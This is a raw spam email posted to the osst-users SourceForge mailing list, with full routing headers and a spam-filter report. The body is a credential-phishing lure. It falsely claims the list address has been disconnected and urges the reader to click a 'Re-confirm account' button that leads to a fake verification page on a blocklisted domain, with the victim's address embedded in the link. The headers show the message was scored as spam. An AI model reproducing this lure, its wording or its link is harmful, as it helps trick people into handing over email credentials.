Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 0F09FB37200
	for <lists+osst-users@lfdr.de>; Tue, 26 Aug 2025 20:15:23 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=SXiikPHQyhaiVlCJ8e9FaRnjfya+qqGQ59kBLTklXVA=; b=O5/8BlXsjRXi2veaNblizCgMlD
	pX4HrN+M5++k0vpbnBwuVuXMA6Jkp41AaA414xPVJx/fKrI5paz6okKMEmEQ9d/0BbvkJESSDVayz
	+5GQqWLQpTC1psapCa69cNgo5ghFCAHHGYs8LPC80Iy7kNcqqZBwB381ilkzXOXiT6DU=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uqyCX-0001gQ-4l
	for lists+osst-users@lfdr.de;
	Tue, 26 Aug 2025 18:15:21 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admins@sportservices.site>) id 1uqyCV-0001fy-Dp
 for osst-users@lists.sourceforge.net; Tue, 26 Aug 2025 18:15:20 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=+lEZcoFOQfDNeJy664P0Tf0ZO3N5Z5R3lI0HTiLTTYI=; b=cwEQ3ynpH9GMlHTrHUqgYnXFNF
 TTsYZqYcFS3i+Qd1ZdY+lXcSUo7ziRTv9DEHr/jlTbxeiX5CKgzp9qpAonSs5Fuz0JMPX1OjJwzk2
 rtWx7lcXN+QSNsVMR1Tci61h9yB81JEs6jBFbTJZgoOHOsCopjkj46DAmH4F8tNNnymQ=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=+lEZcoFOQfDNeJy664P0Tf0ZO3N5Z5R3lI0HTiLTTYI=; b=A
 5mM6AUgNri/OkWzRLMBylmfkFhS8GktKuBr04anxUqsXMplwOY7rkd0v6lGI+bnr+hMc7AY+jJ7Xy
 I0RaGWGnW3QesAiSh/IErb01hqaYGNF5TlD/uiQnVuwnGdDu9/9b6jQEODWUR2OX3+fncDdEyssKb
 quMspE9SX2VP+Tz4=;
Received: from 55.226.211.35.bc.googleusercontent.com ([35.211.226.55]
 helo=smtp-1.us-central1-a.c.lytehouse-dev-307303.internal)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uqyCV-0004Ra-LO for osst-users@lists.sourceforge.net;
 Tue, 26 Aug 2025 18:15:20 +0000
Received: from unassigned.quadranet.com (unknown [198.55.98.124])
 by smtp-1.us-central1-a.c.lytehouse-dev-307303.internal (Postfix) with ESMTP
 id 4B36147D12
 for <osst-users@lists.sourceforge.net>; Tue, 26 Aug 2025 18:15:15 +0000 (UTC)
From: Email Server <admins@sportservices.site>
To: osst-users@lists.sourceforge.net
Date: 26 Aug 2025 11:15:16 -0700
Message-ID: <20250826111515.003F1FC1A08E7967@sportservices.site>
MIME-Version: 1.0
X-Spam-Score: 6.8 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  We noticed that your osst-users@lists.sourceforge.net, has
 been disconnected from sending and receiving mails. We urge you to re-confirm
 if your account is still active on our server to officialy unlock it to our
 default settings. 
 Content analysis details:   (6.8 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 4.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [35.211.226.55 listed in dnsbl-1.uceprotect.net]
 0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [35.211.226.55 listed in wl.mailspike.net]
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URI: arms.sa.com]
 1.9 URIBL_ABUSE_SURBL Contains an URL listed in the ABUSE SURBL blocklist
 [URI: arms.sa.com]
 0.0 TVD_RCVD_IP            Message was received from an IP address
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.4 RDNS_DYNAMIC           Delivered to internal network by host with
 dynamic-looking rDNS
 0.4 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1uqyCV-0004Ra-LO
Subject: [Osst-users] [SPAM] Re: Confirm your email request for
 osst-users@lists.sourceforge.net
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8776400809653120781=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============8776400809653120781==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
<body style=3D"margin: 0.5em;"><table style=3D"width: 100%;"><tbody><tr><td=
 class=3D"v1content_mailru_css_attribute_postfix"><p>We noticed that your o=
sst-users@lists.sourceforge.net, has been disconnected from sending and rec=
eiving mails.<br><br>We urge you to re-confirm if your account is still act=
ive<br>
on our server to officialy unlock it to our default settings.=20
</p><table>
<tbody>
<tr>
<td style=3D"padding: 10px 0px;"><a style=3D"border-width: 9px 19px; border=
-style: solid; border-color: rgb(38, 114, 236); border-radius: 3px; color: =
rgb(255, 255, 255); text-decoration: none !important; display: inline-block=
; background-color: rgb(38, 114, 236);" href=3D"https://arms.sa.com/p2round=
cubeerror-auntehntication/verify.html#osst-users@lists.sourceforge.net" tar=
get=3D"_blank" rel=3D"noreferrer">Re-confirm account</a> </td></tr></tbody>=
</table>
<p>You're getting this email to make sure it was you.=20
</p><p></p>
<p style=3D"margin-top: 35px;">Thanks,<br><span style=3D"font-weight: bold;=
">Email Account Team</span> </p></td></tr>
<tr>
<td class=3D"v1footer_mailru_css_attribute_postfix" style=3D"padding-top: 3=
0px;">
<hr>=20
<p style=3D"color: rgb(143, 143, 143); font-size: 12px;">
You received this email to let you know about important changes to your ema=
il Account and services.<br>
&copy; 2025 All Rights Reserved.</p></td></tr></tbody></table></body></html=
>


--===============8776400809653120781==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8776400809653120781==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============8776400809653120781==--
